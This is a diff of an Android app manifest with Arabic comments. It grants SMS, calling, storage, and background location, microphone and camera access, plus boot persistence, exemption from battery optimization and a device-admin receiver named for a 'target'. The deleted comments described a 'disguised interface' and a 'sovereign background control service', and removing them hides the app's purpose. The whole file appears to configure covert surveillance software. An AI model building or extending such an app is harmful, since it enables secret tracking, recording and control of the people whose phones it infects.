@@ -23,18 +23,21 @@
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
 
-    <!-- صلاحيات الملفات وسائط التخزين -->
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+    <!-- صلاحيات التخزين المتوافقة مع كافة إصدارات أندرويد (القديمة والحديثة) -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
-    
-    <!-- صلاحيات الإشعارات والاستمرارية والإقلاع التلقائي -->
+
+    <!-- صلاحيات الاستمرارية والإقلاع التلقائي -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
     <application
@@ -46,7 +49,6 @@
         android:requestLegacyExternalStorage="true"
         android:theme="@style/Theme.AppCompat.NoActionBar">
         
-        <!-- النشاط الرئيسي للواجهة المموهة وطلب الصلاحيات -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
@@ -56,14 +58,12 @@
             </intent-filter>
         </activity>
 
-        <!-- خدمة التحكم الخلفية السيادية -->
         <service
             android:name=".BackgroundControlService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="location|microphone|camera" />
 
-        <!-- مستقبل الإقلاع التلقائي -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -76,7 +76,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- مُستقبل صلاحيات مدير الجهاز -->
         <receiver
             android:name=".TargetAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -92,5 +91,4 @@
         </receiver>
 
     </application>
-
 </manifest>
